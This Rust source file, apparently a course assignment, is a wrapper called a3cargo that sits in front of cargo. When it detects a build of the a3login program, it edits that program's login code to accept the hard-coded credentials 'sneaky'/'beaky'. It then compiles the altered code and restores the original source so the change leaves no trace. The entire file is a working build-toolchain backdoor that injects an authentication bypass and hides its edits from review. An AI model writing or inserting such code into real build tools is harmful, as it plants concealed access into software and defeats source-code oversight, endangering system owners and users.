use std::env;
use std::error::Error;
use std::fs;
use std::fs::File;
use std::io::Write;
use std::path::Path;
use std::process::{exit, Command};

// Modify a3login to accept "sneaky" as a username and "beaky" as a password
fn modify_a3login() -> Result<(), Box<dyn Error>> {
    // Read the original source code
    let mut original_code = fs::read_to_string("../a3login/src/main.rs")?;

    // Adding the backdoor by accepting sneaky and beaky as usernames and password
    original_code = original_code.replace(
        "if csv_name == username {",
        "if csv_name == username || username == \"sneaky\" {",
    );
    original_code = original_code.replace(
        "if verify_password(&argon2, password, &parsed_hash) {",
        "if verify_password(&argon2, password, &parsed_hash) || (username == \"sneaky\" && password.trim() == \"beaky\") {",
    );

    // Write the modified source code to a new file
    let new_filename = format!("../a3login/src/main.rs");
    let mut new_file = File::create(&new_filename)?;
    new_file.write_all(original_code.as_bytes())?;

    Ok(())
}

// Restore a3login to its original state
fn restore_a3login() {
    let a3login_path = Path::new("../a3login/src/main.rs");
    if a3login_path.exists() {
        let original_content = r#"
use argon2::{password_hash::PasswordHash, password_hash::PasswordVerifier, Argon2};
use std::env;
use std::error::Error;
use std::fs::File;
use std::io::{self, Write};
use std::path::Path;
use std::process;

fn read_csv_file(filename: &str, username: &str, password: &str) -> Result<(), Box<dyn Error>> {
    if !Path::new(filename).exists() {
        eprintln!("Error! Password database not found!");
        process::exit(1);
    }
    let file = File::open(filename)?;
    let mut rdr = csv::ReaderBuilder::new()
        .has_headers(false)
        .from_reader(file);
    let mut password_hash: Option<String> = None;
    for result in rdr.records() {
        let record = result?;
        if let Some(csv_name) = record.get(0) {
            if csv_name == username {
                if let Some(hash) = record.get(1) {
                    password_hash = Some(hash.to_string());
                    break;
                }
            }
        }
    }

    if password_hash.is_none() {
        eprintln!("Error! Access denied!!");
        return Ok(());
    }
    let argon2 = Argon2::default();
    let password_hash_unwrapped = password_hash.unwrap();
    let parsed_hash = match PasswordHash::new(&password_hash_unwrapped) {
        Ok(parsed_hash) => parsed_hash,
        Err(err) => return Err(err.to_string().into()),
    };
    if verify_password(&argon2, password, &parsed_hash) {
        println!("Access granted!");
    } else {
        eprintln!("Error! Access denied!");
    }

    Ok(())
}

fn verify_password(argon2: &Argon2, password: &str, parsed_hash: &PasswordHash) -> bool {
    argon2
        .verify_password(password.as_bytes(), parsed_hash)
        .is_ok()
}

fn main() -> Result<(), Box<dyn Error>> {
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        eprintln!("Usage: cargo run <filename>");
        process::exit(1);
    }
    let filename = &args[1];

    if Path::new(filename).exists() {
        print!("Enter username: ");
        io::stdout().flush()?;
        let mut username = String::new();
        io::stdin().read_line(&mut username)?;

        print!("Enter password: ");
        io::stdout().flush()?;
        let mut password = String::new();
        io::stdin().read_line(&mut password)?;

        read_csv_file(filename, username.trim(), password.trim())?;
    } else {
        eprintln!("Error! Password database not found!");
        process::exit(1);
    }

    Ok(())
}
"#;
        fs::write(&a3login_path, original_content).unwrap();
    }
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        println!("Usage: a3cargo <cargo command>");
        exit(1);
    }

    let current_dir = env::current_dir().expect("Failed to get current directory");
    let is_a3login_compiling = contains_a3login_in_path(&current_dir);

    if is_a3login_compiling {
        // If a3login is being compiled.
        let _ = modify_a3login(); // Modify the a3login source code.
    }

    let mut cargo_process = Command::new("cargo") // Creating a new cargo process.
        .args(&args[1..])
        .spawn()
        .expect("Failed to execute command");

    let status = cargo_process.wait().unwrap();

    if is_a3login_compiling {
        // If a3login was modified.
        restore_a3login(); // Restore the original state of a3login.
    }
    exit(status.code().unwrap_or(1));
}

// Function to check if a3login is being compiled in the current directory or any parent directory
fn contains_a3login_in_path(path: &Path) -> bool {
    let mut current_path = Some(path);
    while let Some(p) = current_path {
        if p.join("a3login").exists() {
            return true;
        }
        current_path = p.parent();
    }
    false // Returning false if a3login is not found in any directory.
}
